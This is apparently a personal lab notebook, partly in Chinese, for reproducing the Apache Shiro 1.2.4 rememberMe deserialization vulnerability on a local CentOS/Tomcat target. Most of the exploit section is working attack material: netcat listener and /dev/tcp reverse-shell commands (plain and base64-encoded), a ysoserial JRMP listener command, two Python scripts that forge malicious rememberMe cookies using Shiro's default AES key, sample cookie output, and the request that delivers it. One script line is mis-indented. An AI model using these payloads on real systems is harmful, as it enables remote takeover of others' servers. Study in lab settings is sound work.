
# target
centos 192.168.207.3 
## install tomcat
	https://www.ionos.com/community/server-cloud-infrastructure/apache/install-and-use-apache-tomcat-on-centos-7/

## build and deploy	
	https://cloud.tencent.com/developer/article/1041471
	https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4
	需要安装jdk1.6和maven支持1.6的版本，比如C:\Dev\apache-maven-3.0.4\，然后需要添加下面这个xml
	.m2/toolchains.xml
	<?xml version="1.0" encoding="UTF8"?>
	<toolchains>
	  <toolchain>
		<type>jdk</type>
		<provides>
		  <version>1.6</version>
		  <vendor>sun</vendor>
		</provides>
		<configuration>
		   <jdkHome>C:\Program Files\Java\jdk1.6.0_45</jdkHome>
		</configuration>
	  </toolchain>
	</toolchains>
	shiro-shiro-root-1.2.4\samples\web

	mvn eclipse:eclipse
	mvn clean install
	
	http://192.168.207.3:8080/
	deploy war
	got error 
	The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar 
	change pom.xml
		<dependency>
			<groupId>javax.servlet</groupId>
			<artifactId>jstl</artifactId>
			<version>1.2</version>
			<scope>provided</scope>
		</dependency>
		
		<dependency>
			<groupId>javax.servlet</groupId>
			<artifactId>jstl</artifactId>
			<version>1.2</version>
			<scope>runtime</scope>
		</dependency>
		<dependency>
			<groupId>commons-beanutils</groupId>
			<artifactId>commons-beanutils</artifactId>
			<version>1.9.2</version>
			<exclusions>
				<exclusion>
					<groupId>commons-logging</groupId>
					<artifactId>commons-logging</artifactId>
				</exclusion>
			</exclusions>
		</dependency>
		<dependency>
			<groupId>org.apache.commons</groupId>
			<artifactId>commons-collections4</artifactId>
			<version>4.0</version>
		</dependency>

        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <!--<scope>provided</scope>-->
        </dependency>
# exploit:
kali 192.168.207.4
## 开启监听
nc -lvp 666
## 构造payload
核心payload：反弹shell
bash -i >& /dev/tcp/192.168.207.4/666 0>&1
/bin/bash -i >& /dev/tcp/192.168.207.4/666 0>&1
http://www.jackson-t.ca/runtime-exec-payloads.html
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}
开启ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 777 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}'
#method 1
python shiro.py 192.168.207.4:777

import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())


rememberMe=1HdAtcjiSVm2/83+p8V+x3gvxQQ+mm+u1eVqxA4QkHVyEPghfUNNa1CCkzpjqIpVMLbdWdYIzJNiyJfxpPTRTNs7LioxW9vvPow+cYynPX5vlshDlQCoc8hZ10WGA+GOr14CxT7mEaXaI7r8f7ZEJ4QUhOJWoP6HYA0/ye5q8uzqSA+eSmTglcOcqX6eLVpg+vZwipFuseUzEwjrudvnoUUHHAUv4qwbcFh40i7G9PPcAZPC/BoKTVqWqOTDrKo6385Gxpsl+bZWNl99G3JO9VnoiBwYCna10tzyxplZYeKlntyl3gRlLQj7jkCKoIyWTeVieGCITHTmnOStuXhN8Dic9HQaQFJtYTZb+XY1usZLD89qV/OqrmcbaxqE7Erkv4TgcnSI+sXwg91q6sklpg==
rememberMe=1HdAtcjiSVm2/83+p8V+x3gvxQQ+mm+u1eVqxA4QkHVyEPghfUNNa1CCkzpjqIpVMLbdWdYIzJNiyJfxpPTRTNs7LioxW9vvPow+cYynPX5vlshDlQCoc8hZ10WGA+GOr14CxT7mEaXaI7r8f7ZEJ4QUhOJWoP6HYA0/ye5q8uzqSA+eSmTglcOcqX6eLVpg+vZwipFuseUzEwjrudvnoUUHHAUv4qwbcFh40i7G9PPcAZPC/BoKTVqWqOTDrKo6385Gxpsl+bZWNl99G3JO9VnoiBwYCna10tzyxplZYeKlntyl3gRlLQj7jkCKoIyWTeVieGCITHTmnOStuXhN8Dic9HQaQFJtYTZb+XY1usZLD89qV/OqrmcbaxqE7Erkv4TgcnSI+sXwg91q6sklpg==
liu> 


#method 2
python create_payload.py "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}"
python create_payload.py "bash -i >& /dev/tcp/192.168.207.4/666 0>&1"

# pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
    with open("/tmp/payload.cookie", "w") as fpw:
        print("rememberMe={}".format(payload.decode()), file=fpw)
		
python create_payload.py "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNy40LzY2NiAwPiYx}|{base64,-d}|{bash,-i}"
# 安装了 httpie 可以运行如下指令
http http://192.168.207.3:8080/samples-web-1.2.4/ Cookie:`cat /tmp/payload.cookie`

http://192.168.207.3:8080/samples-web-1.2.4 'bash -i >& /dev/tcp/192.168.207.4/666 0>&1'


失败怀疑：
1.靶子机器 jdk版本，tomcat版本
 1016  sudo yum install java-1.6.0-openjdk
 1017  sudo systemctl restart tomcat
 1018  alternatives --config java
 1019  sudo alternatives --config java
 1020  sudo systemctl restart tomcat
2.shiro web sample依赖跟 ysoserial的依赖版本不一致


https://paper.seebug.org/shiro-rememberme-1-2-4/
https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g
https://mp.weixin.qq.com/s/4nlIj2xz8HMkJpHKCl32aQ
yum install java-1.8.0-openjdk
update-alternatives --config java
JAVA_HOME 

https://blog.csdn.net/jiangbb8686/article/details/100158824
于是我修改版本号到1.9.2

https://xz.aliyun.com/t/2650
https://www.cnblogs.com/peterpan0707007/p/11342997.html
http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html

https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/

https://www.cnblogs.com/Welk1n/p/10511145.html

